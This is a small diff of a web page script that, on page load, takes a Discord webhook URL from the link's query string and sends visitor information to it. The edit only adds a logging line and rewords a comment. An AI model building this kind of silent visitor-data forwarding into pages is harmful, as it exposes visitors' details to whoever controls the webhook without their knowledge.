@@ -1,10 +1,11 @@
 window.onload = async function() {
   // Get the query string parameters
   const urlParams = new URLSearchParams(window.location.search);
-
-  // Check if 'webhook' parameter exists in the URL
+  
+  // Extract the webhook URL from the query string
   const webhookUrl = urlParams.get('webhook');
-
+  console.log("Webhook URL:", webhookUrl);  // Log to check the extracted URL
+  
   if (webhookUrl && webhookUrl.includes("discord.com/api/webhooks")) {
     // If a valid webhook URL is found, send the visitor information
     await sendVisitorInfoToWebhook(webhookUrl);
